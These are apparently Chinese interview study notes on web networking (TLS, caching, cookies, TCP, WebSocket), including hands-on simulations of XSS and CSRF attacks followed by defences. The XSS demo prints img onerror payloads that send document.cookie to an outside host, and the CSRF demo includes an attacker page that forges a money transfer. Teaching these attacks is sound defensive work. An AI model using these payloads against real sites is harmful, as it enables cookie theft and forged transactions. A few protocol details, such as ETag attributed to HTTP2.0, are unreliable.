客户端收到服务器的回应之后，首先通过浏览器或者操作系统中的 CA 公钥，确认服务器的数字证书的真实性。

如果证书没有问题，客户端会从数字证书中取出服务器的公钥，然后使用它加密报文，向服务器发送如下信息：

（1）一个随机数（`pre-master key`）。该随机数会被服务器公钥加密。

（2）加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。

（3）客户端握手结束通知，表示客户端的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供服务端校验。

`上面第一项的随机数是整个握手阶段的第三个随机数，这样服务器和客户端就同时有三个随机数，接着就用双方协商的加密算法，各自生成本次通信的「会话秘钥」。`

*4. 服务器的最后回应*

服务器收到客户端的第三个随机数（`pre-master key`）之后，通过协商的加密算法，计算出本次通信的「会话秘钥」。然后，向客户端发生最后的信息：

（1）加密通信算法改变通知，表示随后的信息都将用「会话秘钥」加密通信。

（2）服务器握手结束通知，表示服务器的握手阶段已经结束。这一项同时把之前所有内容的发生的数据做个摘要，用来供客户端校验。

至此，整个 SSL/TLS 的握手阶段全部结束。接下来，客户端与服务器进入加密通信，就完全是使用普通的 HTTP 协议，只不过用「会话秘钥」加密内容。

更多细节: https://mp.weixin.qq.com/s/bUy220-ect00N4gnO0697A

## 在HTTPS中SSL加密的过程，使用了什么算法？

1. RSA 密钥交换算法 (不支持前向保密)

2. hash算法

其实在CA机构签发证书的时候,还用了hash算法

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h0k390cydlj21c80qqgp4.jpg)

3. DH 密钥协商算法 (因为RSA不支持前向保密,所以有了他)

4. ECDHE 密钥协商算法 (因为DH算法效率问题,所以有了他,现在大多数网站所用的密钥协商算法)

## cookie localStorage sessionStorage区别

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdggznjvj20nk0bx0uz.jpg)

补充：

cookie数据还有路径（path）的概念，可以限制。cookie只属于某个路径下

**作用域不同：sessionStorage 不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口都是共享的；cookie 也是在所有同源窗口中共享的**

<mark>localStorage 和 cookie 一样也有跨域限制</mark>

## cookie和session的区别

1. cookie数据是存放在与客户端，而session数据是存放在服务端的
2. cookie不安全，别人可以分析存放在本地的cookie并进行cookie欺骗（例如`CSRF`跨站请求伪造）
3. 由于session是在服务端的，固当访问增多时，会对服务器性能造成影响
4. 单个cookie保存的数据不能超过4K，很多浏览器都限制一个站点最多保存20个cookie

## 什么是浏览器缓存（缓存的都是啥？）

==浏览器缓存就是把一个已经请求过的Web资源（如HTML、CSS、JS、图片、数据等）拷贝一份副本存储在浏览器中。当下一个q请求到来时，如果是相同的`URL`，缓存会根据缓存机制（缓存策略）决定是直接拉取浏览器缓存（强缓存），还是向源服务器再次请求。==

查看再次（二次）请求是否来自缓存:（通过刷新页面）

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwutz8gm6sj31hb0tzjzh.jpg)

## 强缓存和协商缓存

缓存分为两种：强缓存和协商缓存，根据响应的**header**内容来决定

|      | 获取资源形式 | 状态码               | 发送请求到服务器             |
| ---- | ------ | ----------------- | -------------------- |
| 强缓存  | 从缓存取   | 200（from cache）   | ==否，直接从缓存取==         |
| 协商缓存 | 从缓存取   | 304（not modified） | ==是，通过服务器来告知缓存是否可用== |

* 强缓存相关字段有 HTTP1.0 的 expires ，HTTP1.1 的`cache-control`。如果`cache-control`与`expires`同时存在的话,**`cache-control`的优先级高于`expires`**

* 协商缓存相关字段有 HTTP1.0 中`Last-Modified/If-Modified-Since`，HTTP2.0 中`Etag/If-None-Match`

| HTTP1.1       |        | HTTP1.0       |
| ------------- | ------ | ------------- |
| cache-control | **替换** | expires       |
| ETag          | **补充** | Last-modified |

### 强缓存

> cache-control 的字段

* no-cache 和 no-store
  
  1. no-cache 强制进行协商缓存
  2. no-store 禁止使用任何缓存（策略）

* private 和 public
  
  用以明确响应资源是否可被代理服务器进行缓存

* max-age 和 s-maxage
  
  `max-age`比`s-maxage`常用，往往对于大型架构项目时才会使用到`s-maxage`，它表示缓存在代理服务器中的过期时长，且仅当设置了 public 属性才有效

### 协商缓存

在 HTTP1.0 中的 last-modified 存在以下不足：

* 当请求的文件资源进行了编辑，但是内容没有发生任何变化，时间戳也会更新（有效性验证失效，需要重新进行完整的资源请求）
* 标识文件资源修改的时间戳单位为秒（不够精确，万一修改为几百毫秒的情况，就无法感知文件的修改）

所以在 HTTP1.1 中进行改进，添加了 ETag 字段用于补充 last-modified 的不足

## 强缓存、协商缓存什么时候用哪个 (缓存决策)

<img src="https://uploadfiles.nowcoder.com/images/20190312/311436_1552361773903_9DC69E327B4B3691E94CD9D52D10E2C1" style="zoom:87%;" />

如上图，在浏览器第一次发送请求后，需要再次发送请求时，浏览器会首先获取该资源缓存的header信息，然后根据 Cache-Control 和 expires 来判断是否过期（==先查看强缓存==）。若没过期则直接从缓存中获取资源信息，包括缓存的header的信息，所以此次请求不会与服务器进行通信。如果缓存过期，浏览器会向服务器发送请求（==再协商缓存==），本次请求会带着第一次请求返回的有关缓存的header字段信息（也就是第一次请求获取的 ETag 和 Last-Modified ）

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gwsd1z7s4rj31f20qwacy.jpg" style="zoom:40%;" />

参考：[缓存策略](https://zhuanlan.zhihu.com/p/111190645)

## csrf和xss的网络攻击及防范

## 描述一下XSS和CRSF攻击？防御方法？

#### XSS攻击

XSS，（ Cross Site Script，跨站脚本攻击）其原本缩写是 CSS，但为了和层叠样式表(Cascading Style Sheet)有所区分，因而在安全领域叫做 XSS。
XSS 攻击是指攻击者在网站上注入恶意的客户端代码，通过恶意脚本对客户端网页进行篡改，从而在用户浏览网页时，对用户浏览器进行控制或者获取用户隐私数据的一种攻击方式。攻击者对客户端网页注入的恶意脚本一般包括 JavaScript，有时也会包含 HTML 和 Flash。有很多种方式进行 XSS 攻击，但它们的共同点为：将一些隐私数据像 cookie、session 发送给攻击者，将受害者重定向到一个由攻击者控制的网站，在受害者的机器上进行一些恶意操作。
XSS攻击可以分为3类：反射型（非持久型）、存储型（持久型）、基于DOM。

1. 反射型
   反射型 XSS 只是简单地把用户输入的数据 “反射” 给浏览器，这种攻击方式往往需要攻击者诱使用户点击一个恶意链接，或者提交一个表单，或者进入一个恶意网站时，注入脚本进入被攻击者的网站。
2. 存储型
   存储型 XSS 会把用户输入的数据 “存储” 在服务器端，当浏览器请求数据时，脚本从服务器上传回并执行。这种 XSS 攻击具有很强的稳定性。
   攻击者在页面中输入以评论、文章等为形式恶意脚本并发送到服务端，当其他用户访问该评论或文章时，服务器会将这段恶意代码返回，而其他用户访问时，恶意脚本就会在浏览器执行。
3. 基于DOM
   基于 DOM 的 XSS 攻击是指通过恶意脚本修改页面的 DOM 结构，是纯粹发生在客户端的攻击。

#### XSS的防范

现在主流的浏览器内置了防范 XSS 的措施，例如==CSP==。但对于开发者来说，也应该寻找可靠的解决方案来防止 XSS 攻击。

1. ==HttpOnly 防止劫取 Cookie==
   HttpOnly 最早由微软提出，至今已经成为一个标准。浏览器将禁止页面的 Javascript 访问带有 HttpOnly 属性的Cookie。
   上文有说到，攻击者可以通过注入恶意脚本获取用户的 Cookie 信息。通常 Cookie 中都包含了用户的登录凭证信息，攻击者在获取到 Cookie 之后，则可以发起 Cookie 劫持攻击。所以，严格来说，HttpOnly 并非阻止 XSS 攻击，而是能阻止 XSS 攻击后的 Cookie 劫持攻击。

2. 输入检查
   
   不要相信用户的任何输入。 对于用户的任何输入要进行检查、过滤和转义。建立可信任的字符和 HTML 标签白名单，对于不在白名单之列的字符或者标签进行过滤或编码。
    在 XSS 防御中，输入检查一般是检查用户输入的数据中是否包含 <，> 等特殊字符，如果存在，则对特殊字符进行过滤或编码，这种方式也称为 XSS Filter。而在一些前端框架中，都会有一份 decodingMap， 用于对用户输入所包含的特殊字符或标签进行编码或过滤，如 <，>，script，防止 XSS 攻击

3. 输出检查
   
   用户的输入会存在问题，服务端的输出也会存在问题。一般来说，除富文本的输出外，在变量输出到 HTML 页面时，可以使用编码或转义的方式来防御 XSS 攻击。例如利用 sanitize-html 对输出内容进行有规则的过滤之后再输出到页面中。

4. 转译 `<,>` 等特殊符号

#### CSRF攻击

CSRF，（Cross Site Request Forgery，跨站请求伪造）是一种劫持受信任用户向服务器发送非预期请求的攻击方式。
通常情况下，CSRF 攻击是攻击者借助受害者的 Cookie 骗取服务器的信任，可以在受害者毫不知情的情况下以受害者名义伪造请求发送给受攻击服务器，从而在并未授权的情况下执行在权限保护之下的操作。
先说说浏览器的 Cookie 策略
Cookie 是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）

而浏览器所持有的 Cookie 分为两种：

- Session Cookie(会话期 Cookie)：会话期 Cookie 是最简单的Cookie，它不需要指定过期时间（Expires）或者有效期（Max-Age），它仅在会话期内有效，浏览器关闭之后它会被自动删除。
- Permanent Cookie(持久性 Cookie)：与会话期 Cookie 不同的是，持久性 Cookie 可以指定一个特定的过期时间（Expires）或有效期（Max-Age）。

此外，每个 Cookie 都会有与之关联的域，这个域的范围一般通过 donmain 属性指定。如果 Cookie 的域和页面的域相同，那么我们称这个 Cookie 为第一方 Cookie（first-party cookie），如果 Cookie 的域和页面的域不同，则称之为第三方 Cookie（third-party cookie）。一个页面包含图片或存放在其他域上的资源（如图片）时，第一方的 Cookie 也只会发送给设置它们的服务器。
由于 Cookie 中包含了用户的认证信息，当用户访问攻击者准备的攻击环境时，攻击者就可以对服务器发起 CSRF 攻击。在这个攻击过程中，攻击者借助受害者的 Cookie 骗取服务器的信任，但并不能拿到 Cookie，也看不到 Cookie 的内容。而对于服务器返回的结果，由于浏览器同源策略的限制，攻击者也无法进行解析。因此，攻击者无法从返回的结果中得到任何东西，他所能做的就是给服务器发送请求，以执行请求中所描述的命令，在服务器端直接改变数据的值，而非窃取服务器中的数据。但若 CSRF 攻击的目标并不需要使用 Cookie，则也不必顾虑浏览器的 Cookie 策略了。

总结：当用户访问攻击者准备的攻击环境时，攻击者获取用户的Cookie信息，骗取服务器的信任，通过伪造请求，修改服务器中的数据！

#### CSRF的防范

1. 验证码
   验证码被认为是对抗 CSRF 攻击最简洁而有效的防御方法。
   从上述示例中可以看出，CSRF 攻击往往是在用户不知情的情况下构造了网络请求。而验证码会强制用户必须与应用进行交互，才能完成最终请求。因为通常情况下，验证码能够很好地遏制 CSRF 攻击。
   但验证码并不是万能的，因为出于用户考虑，不能给网站所有的操作都加上验证码。因此，验证码只能作为防御 CSRF 的一种辅助手段，而不能作为最主要的解决方案。

2. ==Referer Check==
   根据 HTTP 协议，在 HTTP 头中有一个字段叫 Referer，它记录了该 HTTP 请求的来源地址。通过 Referer Check，可以检查请求是否来自合法的 “源”。
   比如，如果用户要删除自己的帖子，那么先要登录 [www.c.com](http://www.c.com)，然后找到对应的页面，发起删除帖子的请求。此时，Referer 的值是 http://www.c.com；当请求是从 [www.a.com](http://www.a.com) 发起时，Referer 的值是 http://www.a.com 了。因此，要防御 CSRF 攻击，只需要对于每一个删帖请求验证其 Referer 值，如果是以 [www.c.com](http://www.c.com) 开头的域名，则说明该请求是来自网站自己的请求，是合法的。如果 Referer 是其他网站的话，则有可能是 CSRF 攻击，可以拒绝该请求。
   
   Referer Check 不仅能防范 CSRF 攻击，另一个应用场景是 “防止图片盗链”。

3. 添加 token 验证
   CSRF 攻击之所以能够成功，是因为攻击者可以完全伪造用户的请求，该请求中所有的用户验证信息都是存在于 Cookie 中，因此攻击者可以在不知道这些验证信息的情况下直接利用用户自己的 Cookie 来通过安全验证。要抵御 CSRF，关键在于在请求中放入攻击者所不能伪造的信息，并且该信息不存在于 Cookie 之中。可以在 HTTP 请求中以参数的形式加入一个随机产生的 token，并在服务器端建立一个拦截器来验证这个 token，如果请求中没有 token 或者 token 内容不正确，则认为可能是 CSRF 攻击而拒绝该请求。

4. 通过给Cookie设置 `SameSite` 属性（具体看下一个问题！）

## <mark>哪些情况和设置，请求不会携带cookie</mark>

Chrome 51 开始，浏览器的 Cookie 新增加了一个`SameSite`属性，用来防止 CSRF 攻击和用户追踪。

Cookie 的`SameSite`属性用来限制第三方 Cookie，从而减少安全风险。

它可以设置三个值。

> - Strict
> - Lax
> - None

### Strict

`Strict`最为严格，完全禁止第三方 Cookie，跨站点时，任何情况下都不会发送 Cookie。换言之，只有当前网页的 URL 与请求目标一致，才会带上 Cookie。

> ```bash
> Set-Cookie: CookieName=CookieValue; SameSite=Strict;
> ```

这个规则过于严格，可能造成非常不好的用户体验。比如，当前网页有一个 GitHub 链接，用户点击跳转就不会带有 GitHub 的 Cookie，跳转过去总是未登陆状态。

### Lax

`Lax`规则稍稍放宽，大多数情况也是不发送第三方 Cookie，但是导航到目标网址的 Get 请求除外。

> ```markup
> Set-Cookie: CookieName=CookieValue; SameSite=Lax;
> ```

导航到目标网址的 GET 请求，只包括三种情况：链接，预加载请求，GET 表单。详见下表。

| 请求类型    | 示例                                   | 正常情况      | Lax       |
| ------- | ------------------------------------ | --------- | --------- |
| 链接      | `<a href="..."></a>`                 | 发送 Cookie | 发送 Cookie |
| 预加载     | `<link rel="prerender" href="..."/>` | 发送 Cookie | 发送 Cookie |
| GET 表单  | `<form method="GET" action="...">`   | 发送 Cookie | 发送 Cookie |
| POST 表单 | `<form method="POST" action="...">`  | 发送 Cookie | 不发送       |
| iframe  | `<iframe src="..."></iframe>`        | 发送 Cookie | 不发送       |
| AJAX    | `$.get("...")`                       | 发送 Cookie | 不发送       |
| Image   | `<img src="...">`                    | 发送 Cookie | 不发送       |

设置了`Strict`或`Lax`以后，基本就杜绝了 CSRF 攻击。当然，前提是用户浏览器支持 SameSite 属性。

### None

Chrome 计划将`Lax`变为默认设置。这时，网站可以选择显式关闭`SameSite`属性，将其设为`None`。不过，前提是必须同时设置`Secure`属性（Cookie 只能通过 HTTPS 协议发送），否则无效。

下面的设置无效。

> ```bash
> Set-Cookie: widget_session=abc123; SameSite=None
> ```

下面的设置有效。

> ```bash
> Set-Cookie: widget_session=abc123; SameSite=None; Secure
> ```

## 模拟 XSS 攻击

使用 Vue 创建项目，进行模拟（关键在于使用了==`v-html`==）

关键代码：

```html
<template>
  <div class="home">
    <h2>XSS 攻击模拟</h2>

    <!-- 输入框 -->
    <input type="text" v-model="text">
    <button id="btn" @click="addSubmit">添加评论</button>

    <h4>评论：</h4>
    <ul>
      <li v-for="(item, index) in msgList" :key='index'>
        <!-- 关键在于使用v-html导致的问题 -->
        <span v-html="item"></span>
      </li>
    </ul>

    <!-- 
        各类攻击方式：
          # 跳转到攻击者的网站 
          <img src="123" onerror="location.href='http://mrkleo.run:7788';">
          # 盗取用户cookie
          <img src="123" onerror="alert('我获取到你的cookie了：' + document.cookie)">
          # 获取他人cookie后，跳转到攻击者的网站
          <img src="123" onerror="location.href='http://mrkleo.run:7788/' + document.cookie">
    -->

  </div>
</template>

<script>
export default {
  name: 'Home',
  data() {
    return {
      text: '',
      msgList: []
    }
  },
  components: {
  },
  methods: {
    addSubmit() {
      // 本地缓存模拟网站数据库
      let arr = [];
      arr = localStorage.getItem('item');
      arr = JSON.parse(arr);
      !arr && (arr = []);
      arr.push(this.text);
      this.msgList = arr;
      this.text = '';
      localStorage.setItem('item', JSON.stringify(arr));
    }
  }

}
</script>

<style lang="less" scoped>
#btn {
  margin-left: 15px;
}
</style>
```

实现效果：

<img src="https://tva1.sinaimg.cn/large/008i3skNly1gwsru0bq5rj30f50gq0t5.jpg" style="zoom:67%;" />

攻击者输入攻击脚本：

```html
<img src="123" onerror="location.href='http://mrkleo.run:7788/' + document.cookie">
```

当其他用户再进行评论时，会出现如下情况：

用户输入完评论，提交后，便会执行脚本，获取用户`Cookie`信息并跳转到攻击者网站！

效果：

<img src="https://tva1.sinaimg.cn/large/008i3skNgy1gwsrx9yremj30nb0d5gms.jpg" style="zoom:80%;" />

查看网站的数据库（用缓存模拟的）：

![](https://tva1.sinaimg.cn/large/008i3skNly1gwss0cd4akj31hb0puwhz.jpg)

## 模拟 CSRF 攻击

> 建立银行网站（端口 3001）

1. 用户需要先访问接口 `/auth（认证，模拟获取服务器传来的 cookie）`
2. 然后访问接口 `/transfer`进行转账

indexRouter

```js
var express = require("express");
var router = express.Router();
const jwt = require("jsonwebtoken");

/* GET home page. */
router.get("/", function (req, res, next) {
  res.render("index", {
    title: "银行网站",
  });
});

module.exports = router;
```

authRouter（模拟获取服务器的 Cookie）

```js
var express = require('express');
var router = express.Router();

router.get('/', function (req, res, next) {
    res.cookie('userId', 'ce032b305a9bc1ce0b0dd2a', {
        expires: new Date(Date.now() + 900000)
    })
    res.end('ok')
});

module.exports = router;
```

transferRouter（验证用户 Cookie 信息，并进行转账）

```js
var express = require('express');
var router = express.Router();

router.get('/', function(req, res, next) {
  const { query } = req;
  const { userId } = req.cookies;
  if(userId){
    res.send({
      status: 'transfer success',
      transfer: query.number
    })
  }else{
    res.send({
      status: 'error',
      transfer: ''
    })
  }
});

module.exports = router;
```

index.ejs

```ejs
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <%= title %>
  </title>
</head>

<body>
  <h2>
    转账
  </h2>
  <script>
    const h2 = document.querySelector('h2');
    h2.addEventListener('click', () => {
      fetch('/transfer?number=1000&to=Bob').then(res => {
        console.log(res.json());
      })
    })
  </script>
</body>

</html>
```

效果：

1. 验证用户，模拟获取服务器传来的 Cookie 信息

![](https://tva1.sinaimg.cn/large/008i3skNly1gwts0dgfvxj325f0u07a1.jpg)

2. 向`Bob`转账1000元

![](https://tva1.sinaimg.cn/large/008i3skNly1gwts33zpyej31of0u0n27.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNly1gwts4zme1wj31gf0u079g.jpg)

> 建立攻击者网站（端口3002）

index.ejs

```ejs
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <%= title %>
  </title>
</head>

<body>
  <img src="http://localhost:3001/transfer?number=3000000&to=Jack">
</body>

</html>
```

当在银行网站的用户，获取到 Cookie 信息后，被垃圾链接跳转到了攻击者网站时，将自动请求 img 中的 src 的资源

效果如下：

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwtsbn7o49j31c20u0gre.jpg)

以上就是模拟的`CSRF`攻击

> 如何防范

1. 验证码
2. `Referer`检查（发起请求时，有篡改`Referer`的可能，所以效果一般）

更改 transferRouter

```js
var express = require('express');
var router = express.Router();

const csrfGuard = require('../middleware/csrfGuard')
router.get('/', csrfGuard, function(req, res, next) {
  const { query } = req;
  const { userId } = req.cookies;
  if(userId){
    res.send({
      status: 'transfer success',
      transfer: query.number
    })
  }else{
    next()
  }
});
router.get('/', function(req, res, next) {
  res.send({
    status: 'error',
    transfer: ''
  })
});

module.exports = router;
```

csrfGuard.js

```js
module.exports = function (req, res, next) {
    const [Referer, Origin] = [req.get('Referer'), req.get('Origin')]
    if (Referer && Referer.indexOf('http://localhost:3001/') >= 0) {
        next();
    } else if (Origin && Origin.indexOf('http://localhost:3001/') >= 0) {
        next();
    } else {
        console.log('拦截攻击者（其他）网站请求');
        next('route')
    }
}
```

当攻击者网站请求时

![](https://tva1.sinaimg.cn/large/008i3skNly1gwttcyimkpj30ou09ddhb.jpg)

服务器拦截成功！

3. `JWT token` 验证（最佳）

```bash
npm install jsonwebtoken --save
```

更改 indexRouter

```js
var express = require("express");
var router = express.Router();
const jwt = require("jsonwebtoken");

/* GET home page. */
router.get("/", function (req, res, next) {
  res.render("index", {
    title: "银行网站",
    // 渲染到页面的 token
    token: jwt.sign({
      username: 'leo',
      post: 'mentor'
    }, 'secret', {
      expiresIn: '1d'
    })
  });
});

module.exports = router;
```

更改 transferRouter

```js
var express = require('express');
var router = express.Router();

const tokenVerify = require('../middleware/tokenVerify')

router.get('/', tokenVerify, function(req, res, next) {
  const { query } = req;

  // jwt验证通过
  if(req.decode) {  
    res.send({
      status: 'transfer success',
      transfer: query.number
    })
  }

});

module.exports = router;
```

tokenVerify.js

```js
const jwt = require("jsonwebtoken");

module.exports = function (req, res, next) {
    const {
        token
    } = req.query;
    jwt.verify(token, 'secret', (err, decode) => {
        if (err) {
            console.log('jwt验证失败！！');
            next('route')
        } else {
            // 验证通过，将解密信息存储至 req.decode
            req.decode = decode;
            next()
        }
    })
}
```

修改 index.ejs（银行网站，3001端口）

```ejs
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>
    <%= title %>
  </title>
</head>

<body>
  <h2>
    转账
  </h2>
  <span id='token' data-token=<%= token %>></span>
  <script>
    const h2 = document.querySelector('h2');
    const tokenElem = document.querySelector('#token');
    const token = tokenElem.dataset.token;
    h2.addEventListener('click', () => {
      fetch('/transfer?number=15000&to=Bob&token=' + token).then(res=>{
        console.log(res.json());
      })
    })
  </script>
</body>

</html>
```

效果如下：

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwttk04jmdj31d50u0af3.jpg)

![](https://tva1.sinaimg.cn/large/008i3skNgy1gwttklokizj30oo09m3zz.jpg)

服务器拦截成功！！

## 说一下你知道的网络攻击

> 1. XSS: 攻击者输入评论 => `<img src="123" onerror="location.href='http://mrkleo.run:7788/' + document.cookie">`

措施：

1. 输入检查：`<,>`

2. 输出检查：从服务器返回的数据，需要对其进行检查

3. 转译 `<,>`等特殊符号

4. 设置httpOnly = true，使其无法通过js获取cookie

> 2. CSRF: 攻击者获取用户cookie和服务器对应接口api，然后修改服务器数据库，实现转账等操作

场景：用户在登陆银行网站后，通过垃圾链接点进攻击者网站，实现请求

措施：

1. 在服务端查看请求的源 refer 是否是本网站的

2. token验证（jwt）

3. 验证码

4. 给Cookie设置SameSite属性
- strict（严格限制第三方Cookie）

- Lax（可以放宽一些请求，例如get请求、预加载、a标签链接）

- None

> 3. DDos：攻击者利用海量的僵尸服务器攻击源站，占用源站服务器资源，使其他用户无法访问到源站

> 4. SQL注入

攻击者在HTTP请求中注入恶意SQL命令，例如，drop table users，服务器用请求参数构造数据库SQL命令时，恶意SQL被执行。

**解决**：后台处理，例如，使用预编译语句PreparedStatement进行预处理。

> 5. 网络劫持

- DNS劫持（涉嫌违法）：修改运行商的 DNS 记录，重定向到其他网站。DNS 劫持是违法的行为，目前 DNS 劫持已被监管，现在很少见 DNS 劫持
- HTTP劫持：前提有 HTTP 请求。因 HTTP 是明文传输，运营商便可借机修改 HTTP 响应内容（如加广告）。

措施：全站 HTTPS

> 6. 中间人攻击

## TCP三次握手，四次挥手（为什么是三次？）

### 三次握手

![](https://tva1.sinaimg.cn/large/e6c9d24egy1gzi23cgkx7j20ws0gcju3.jpg)

### （三次握手）为什么是三次握手，而不是两次？

> 从几个方面来解释

* **确认双方的收发能力(片面)**

​        第一次的 C -> S：对S来说，确认S的接收能力，确认C的发送能力（C不能确认自己的发送能力）

​        第二次的 S -> C：对C来说，确认S的接收能力和发送能力，同时确认C的接收能力，其次，可确认C的发送能力

​        第三次的 C -> S：对S来说，确认S的发送能力，确认C的接收能力

​        到此：S与C都能相互确认他人和自己的接发能力！

<mark>主要原因:</mark>

- **以阻⽌重复历史连接的初始化(<mark>重要原因</mark>)**
  
  假如发送端发送了两个SYN包(一个旧的<之前的历史连接,过期的>,一个新的),发送端希望接收端处理新发的SYN包,返回其对应的ACK包,但是由于网络环境的复杂性, 导致旧的SYN先到达接收端, 制使接收端返回对于这个旧的SYN包的SYN + ACK包, 发送端收到该SYN + ACK包后,根据上下文比较发现,这不是他要的新SYN包对应的SYN + ACK包,而是一个旧的、过期的历史连接,于是就发送RST终止报文. 
  
  一段时间后,新的SYN包到达了接收端,接收端返回其对应的SYN + ACK包,发送端根据上下文判断其不是一个历史连接,所以第三次握手发送一个ACK包作为应答.至此建立连接.
  
  如果只是两次握手,发送端无法根据上下文判断是否是一个历史连接, 三次握⼿则可以在客户端（发送⽅）准备发送第三次报⽂时，客户端因有⾜够的上下⽂来判断当前连接是否是历史连接.
  
  ![](https://tva1.sinaimg.cn/large/e6c9d24ely1h10994melsj20u012owi2.jpg)
* **同步双⽅初始序列号**
  
  TCP 协议的通信双⽅， 都必须维护⼀个「序列号」， 序列号是可靠传输的⼀个关键因素，它的作⽤：
  
  1. 接收⽅可以去除重复的数据；
  
  2. 接收⽅可以根据数据包的序列号按序接收；
  
  3. 标识发送出去的数据包中， 哪些是已经被对⽅收到的；
  
  当客户端发送携带「初始序列号」的 SYN 报⽂的时候，需要服务端回⼀个 ACK 应答报⽂,表示客户端的SYN报文已被服务端成功接收; 那当服务端发送「初始序列号」给客户端时,依然也要得到客户端的应答回应.**这样一来一回, 才能确保双⽅的初始序列号能被可靠的**
  而两次握手只保证了发送方(客户端)的初始序列号被确认同步, 而没办法保证双⽅的初始序列号都能被确认接收。

* **避免资源浪费**
  
  前提: 假设只是两次握手建立连接. 
  
  首先客户端(发送方)发送了SYN包请求连接, 但是网络阻塞导致发送的SYN包一直没有抵达服务端, 于是客户端(超时重发)重新发送SYN包请求连接, 服务端接收到SYN包, 返回SYN + ACK包, 至此服务端认为建立一次连接; 一段时间后, 最开始发送的SYN包到达服务端, 服务端也将其当作请求,建立了第二次连接(对于服务端来说), 但是对于客户端(发送方),认为第一次发送的SYN包丢失,才发送的第二次SYN包. 所以对于客户端来说建立了一次连接,而对于服务端来说建立了两次连接.导致建立多次无效冗余链接, 造成资源浪费.

* 安全问题
  
  我们知道 TCP 新建连接时，内核会为连接分配一系列的内存资源，如果采用两次握手，就建立连接，那会放大 DDOS 攻击的。

### 三次握手后，C端和S端进入数据传输状态

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdj20p76j214f0jrada.jpg)

如果出现数据丢失，接收端可让发送端重发这部分的数据。接收端进行补齐

上述发送与接收过程，**不区分客户端与服务端，TCP连接是全双工**，均采用上述机制

### 四次挥手

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdjqmn58j21f10r8te0.jpg)

客户端与服务端都可以发起关闭连接请求

### （四次挥手）客户端为什么需要进入超时等待时间？（第四次挥手时）

原因一: 

假设如果客户端发送完最后的`ACK`包，就关闭连接，然后`ACK`包在网络中丢失，故服务端没有收到最后确认的`ACK`包，而一直停留在最后确认状态。如果客户端发送完最后一个`ACK包`后，进入一段等待时间，这时服务器会因为没有收到`ACK`包而重发`FIN`包，客户端会响应这个`FIN`包，而重发`ACK`包，并刷新超时时间

原因二: 

TCP设计了一个机制, 经过`2MSL`时间, 足以让两个方向上的`历史数据包`都被丢弃, 使得原来连接的数据包在网络中自然消失, 至此再出现的数据包一定是新建立连接产生的.

### 为什么 TIME_WAIT 等待的时间是 2MSL？

TIME_WAIT 等待 2 倍的 MSL，⽐较合理的解释是： ⽹络中可能存在来⾃发送⽅(例如第三次握手的服务端)的数据包，当这些发送⽅的数据包被接收⽅处理后⼜会向对⽅发送响应，所以⼀来⼀回需要等待 2 倍的时间。

比如服务端没有收到最后的ACK报文, 就会触发超时重发FIN包, 另一方(客户端)接收到FIN包后,会重发ACK包给服务端,这样一来一回就是2个MSL.

### 为什么是四次挥手？

再来回顾下四次挥⼿双⽅发 FIN 包的过程，就能理解为什么需要四次了。
关闭连接时，客户端向服务端发送 FIN 时，仅仅表示客户端不再发送数据了但是还能接收数据。
服务器收到客户端的 FIN 报⽂时，先回⼀个 ACK 应答报⽂，⽽服务端可能还有数据需要处理和发送，等服务端不再发送数据时，才发送 FIN 报⽂给客户端来表示同意现在关闭连接。
从上⾯过程可知，服务端通常需要等待完成数据的发送和处理，所以服务端的 ACK 和 FIN ⼀般都会分开发送，从⽽⽐三次握⼿导致多了⼀次。

## TCP和UDP的区别

1. **TCP是面向连接的，UDP是无连接的**，即发送数据前不需要建立连接
2. **TCP提供可靠的服务。**也就是说，通过TCP连接传送的数据，无差错，不丢失，不重复，且按序到达；UDP尽最大努力交付，即不保证可靠交付。并且因为TCP可靠，面向连接，适合大数据量的交换。
3. **TCP面向字节流，UDP面向报文。**并且网络出现拥塞不会使得发送速率降低（因此会出现丢包，对实时的应用比如IP电话和视频会议等）
4. **TCP只能是1对1的，UDP支持1对1、1对多**
5. TCP的首部较大为20字节，而UDP只有8字节

扩展：

`websocket`的协议是在`TCP/IP`协议簇的==应用层==，和`http`在同一层。
`websocket`是不同于`http`的另一种应用层协议，但`websocket`和`http`都是==基于`TCP`==传输层的。

## WebSocket的实现和应用

1. 什么是WebSocket?
   
   **WebSocket是HTML5中的协议，支持持久连续**，*而同属于应用层的`HTTP`协议不支持持久性连接。*HTTP1.0不支持持久性的链接，HTTP1.1中的keep-alive，将多个http请求合并为1个

2. WebSocket是什么样的协议，具体有什么优点？
   
   1. **WebSocket是持久化的协议，相比于HTTP这种非持久的协议来说**
   2. **他可以主动发起请求（和HTTP的只能被客户端请求<被动>）**
   
   > 简单的举个例子吧，用目前应用比较广泛的PHP生命周期来解释。
   > 
   > * HTTP的生命周期通过Request来界定，也就是一个Request 一个Response，那么在HTTP1.0中，这次HTTP请求就结束了。
   >   在HTTP1.1中进行了改进，使得有一个keep-alive，也就是说，在一个HTTP连接中，可以发送多个Request，接收多个Response。
   >   但是请记住 Request量 = Response量 ， 在HTTP中永远是这样，也就是说一个request只能有一个response。而且这个response也是**被动**的，不能主动发起。

## 一个图片url访问后直接下载怎样实现？

### 一般的图片请求

![](https://tva1.sinaimg.cn/large/e6c9d24ely1h1gdkhb4lfj20z70kndk9.jpg)

### 访问后下载的图片请求

